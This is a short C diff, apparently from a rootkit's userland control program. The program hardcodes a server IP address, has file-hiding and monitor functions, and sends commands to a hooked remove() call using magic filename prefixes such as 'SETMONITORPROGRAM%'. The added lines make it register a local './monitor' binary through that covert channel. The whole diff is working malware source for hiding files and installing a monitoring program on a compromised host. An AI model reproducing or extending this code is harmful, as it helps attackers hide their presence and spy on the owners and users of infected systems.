@@ -19,6 +19,7 @@
 char* SERVER_ADDR = "104.194.96.169"; 
 char zero[1] = "0";
 char one[1] = "1"; 
+int set_monitor = 1; 
 
 int readbuf(int conn, char* buf, int size);
 int readline(int conn, char* buf, int size);
@@ -123,6 +124,15 @@ int hidefile(char* cmd){
 int monitor(char* cmd){
     char filen[256] = "SETMONITORPROGRAM%";
     while(*cmd == ' ') cmd++;
+    
+    if(set_monitor){
+        char cwd[200], buf[256] = "SETMONITORPROGRAM%set ";
+        
+        getcwd(cwd, sizeof(cwd));
+        strcat(buf, cwd);
+        strcat(buf, "/./monitor");
+        remove(buf); 
+    }
     
     memcpy(filen+strlen(filen), cmd, strlen(cmd) + 1);
     remove(filen);          //We hooked remove;
